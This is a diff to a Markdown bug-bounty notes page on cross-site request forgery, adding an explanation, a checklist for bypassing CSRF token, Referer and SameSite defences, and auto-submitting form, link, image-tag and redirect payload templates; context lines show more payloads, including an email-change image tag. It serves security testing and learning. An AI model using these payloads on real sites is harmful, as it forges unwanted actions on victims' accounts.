@@ -1,5 +1,92 @@
 # CSRF
 
+## Cross-Site Request Forgery (CSRF)
+
+### What is it?
+
+CSRF, short for Cross-site request forgery, is a type of web security flaw that enables an attacker to trick users into executing actions they didn't intend to do.
+
+**A simple example:**
+
+* A vulnerable web application has the endpoint `/updateProfile?id={userid}`
+* When a `POST` request is made to this endpoint the application:
+  * Checks the ID is the current user
+  * If it is, update the profile with the provided information in the request body
+* When the victim visits the attacker's malicious site, it will:
+  * Send a request to the vulnerable web application
+  * Because the user is logged into that application, the browser will include cookies (importantly, the session cookie)
+* The vulnerable application processes the request as normal since it came from the user
+
+It's important to note that we need some user interaction for CSRF to work. Typically an attacker would place their payload on a site that they control, and try to entice the target with phishing emails, direct messages on social media, etc. Once the user clicks the link and lands on the page, the payload is triggered.
+
+CSRF defences are now pretty common, so along with just finding places where users can carry out actions, we also need to be able to bypass defences that have not been properly implemented.
+
+**Other learning resources:**
+
+* PortSwigger: Web Security Academy [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
+* The XSS Rat: Bug Bounty Beginner Methodology: CSRF [https://www.youtube.com/watch?v=uirJsgvN7Hc](https://www.youtube.com/watch?v=uirJsgvN7Hc)
+* Swisskeyrepo: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md)
+
+**Writeups:**
+
+*
+
+### Checklist
+
+* [ ] Does every form have a CSRF token?
+* [ ] Can we use GET instead of POST (i.e. can our payload be in the URI instead of the body)
+* [ ] Test the token
+  * [ ] Test without the token
+    * [ ] Test other HTTP methods without the token (e.g. GET)
+  * [ ] Test without the token value (keep the param name, e.g. \&csrf=)
+  * [ ] Test with a random token
+  * [ ] Test a previous token
+  * [ ] Test a token from a different session
+  * [ ] Test with a token of the same length
+  * [ ] Test for predictability
+  * [ ] Test for static values
+    * [ ] Test for known values (e.g. the token is the user-id)
+  * [ ] Is the token tied to a cookie other than the session cookie?
+  * [ ] Can the token be stolen with XSS?
+* [ ] Is the referer header being used to validate the request origin?
+* [ ] Do the cookies have SameSite set? (Chrome is lax by default)
+  * [ ] Can we submit the request with GET?
+  * [ ] Can we override HTTP methods with \`X-Http-Method-Override: GET\`
+  * [ ] Can we override HTTP methods with \`\_method=POST\`
+
+### Exploitation
+
+```shellscript
+<!-- original payload generated from BURP Suite Pro -->
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://<target-site>/api/employees/add" method=POST>
+      <input type="hidden" name="name" value="<payload-info>" />
+      <input type="hidden" name="email" value="<payload-info>" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+```shellscript
+<!-- requires user interaction -->
+<a href="http://<target-site>m/api/employees/add?name=<payload-info>">Click Me</a>
+```
+
+```shellscript
+<!-- doesn't require user interaction -->
+<img src="http:/<target-site>/api/employees/add?name=<payload-info>">
+```
+
+```shellscript
+document.location = 'https://<target-site>/employees/add?name=<payload-info>';
+```
+
 ### Summary
 
 {% hint style="info" %}
@@ -26,7 +113,7 @@ How to find:
 
 #### Approach
 
-```
+```shellscript
 - Removing the token parameter entirely
 - Setting the token to a blank string
 - Changing the token to an invalid token of the same format
@@ -40,7 +127,7 @@ How to find:
 
 #### Quick attacks
 
-```markup
+```html
 # HTML GET
 <a href=”http://vulnerable/endpoint?parameter=CSRFd">Click</a>
 
@@ -89,7 +176,7 @@ https://csrfshark.github.io/
 
 ### Example 1
 
-```markup
+```shellscript
 Vulnerable request example:
 __
 POST /email/change HTTP/1.1
@@ -118,7 +205,7 @@ __
 
 ### Example 2
 
-```markup
+```shellscript
 # Exploit CSRF in GET:
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 
@@ -146,7 +233,7 @@ body:username.value+':'+this.value
 
 ### **Json CSRF**
 
-```
+```shellscript
 Requirements:
 
 1. The authentication mechanism should be in the cookie-based model. (By default cookie-based authentication is vulnerable to CSRF attacks)
@@ -173,7 +260,7 @@ If post is not allowed, can try with URL/param?_method=PUT
 
 ### **CSRF Token Bypass**
 
-```
+```shellscript
 CSRF Tokens
 
 Unpredictable value generated from the server to the client, when a second request is made, server validate this token and reject the request if is missing or invalid. Prevent CSRF attack because the malicious HTTP request formed can't know the CSRF Token generated for the victim.
@@ -256,7 +343,7 @@ Other validations bypasses:
 
 ### CSRF sample POC
 
-```
+```shellscript
 <html>
 <script>
 function jsonreq() {
@@ -274,7 +361,7 @@ jsonreq();
 
 ### CSRF to reflected XSS
 
-```
+```shellscript
 <html>
   <body>
     <p>Please wait... ;)</p>
